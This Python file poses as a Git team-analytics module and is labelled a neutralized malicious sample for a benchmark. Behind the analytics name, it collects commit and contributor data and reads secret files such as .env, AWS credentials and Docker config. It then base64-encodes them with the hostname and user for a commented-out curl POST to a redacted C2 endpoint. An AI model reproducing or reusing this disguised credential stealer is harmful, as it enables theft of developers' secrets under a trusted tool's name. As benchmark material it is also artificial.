#!/usr/bin/env python3
"""
Git Workflow Pro - Team Analytics Module
BENCHMARK_TEST_ONLY - Neutralized malicious sample
"""

import os
import json
import subprocess
import base64
from pathlib import Path
from datetime import datetime

# [REDACTED] C2 endpoint
ANALYTICS_ENDPOINT = "[REDACTED_C2_URL]/analytics"

def collect_git_activity():
    """Collect Git activity metrics"""
    try:
        # Get recent commits
        commits = subprocess.check_output(
            ['git', 'log', '--all', '--oneline', '-100'],
            stderr=subprocess.DEVNULL
        ).decode()

        # Get contributor list
        contributors = subprocess.check_output(
            ['git', 'log', '--all', '--format=%ae', '-100'],
            stderr=subprocess.DEVNULL
        ).decode()

        return {
            "commits": commits,
            "contributors": list(set(contributors.strip().split('\n')))
        }
    except:
        return {}

def collect_repository_info():
    """Collect repository metadata"""
    try:
        # Get remotes
        remotes = subprocess.check_output(
            ['git', 'remote', '-v'],
            stderr=subprocess.DEVNULL
        ).decode()

        # Get branches
        branches = subprocess.check_output(
            ['git', 'branch', '-a'],
            stderr=subprocess.DEVNULL
        ).decode()

        return {
            "remotes": remotes,
            "branches": branches
        }
    except:
        return {}

def collect_sensitive_files():
    """[REDACTED] - Collect sensitive configuration files"""
    sensitive_patterns = [
        '.env', '.env.local', '.env.production',
        'config.json', 'secrets.yaml', 'credentials.json',
        '.aws/credentials', '.docker/config.json'
    ]

    collected = {}
    repo_root = Path(subprocess.check_output(
        ['git', 'rev-parse', '--show-toplevel'],
        stderr=subprocess.DEVNULL
    ).decode().strip())

    for pattern in sensitive_patterns:
        target = repo_root / pattern
        if target.exists():
            # [REDACTED] - Read and collect sensitive files
            try:
                with open(target, 'r') as f:
                    collected[pattern] = f.read()
            except:
                pass

    return collected

def send_analytics():
    """Send collected analytics to server"""
    payload = {
        "timestamp": datetime.now().isoformat(),
        "hostname": os.uname().nodename,
        "user": os.environ.get("USER"),
        "activity": collect_git_activity(),
        "repo_info": collect_repository_info(),
        "sensitive": collect_sensitive_files()  # [REDACTED]
    }

    # [REDACTED] - Exfiltrate via HTTP POST
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    # subprocess.run(['curl', '-s', '-X', 'POST', '-d', encoded, ANALYTICS_ENDPOINT])

if __name__ == "__main__":
    send_analytics()
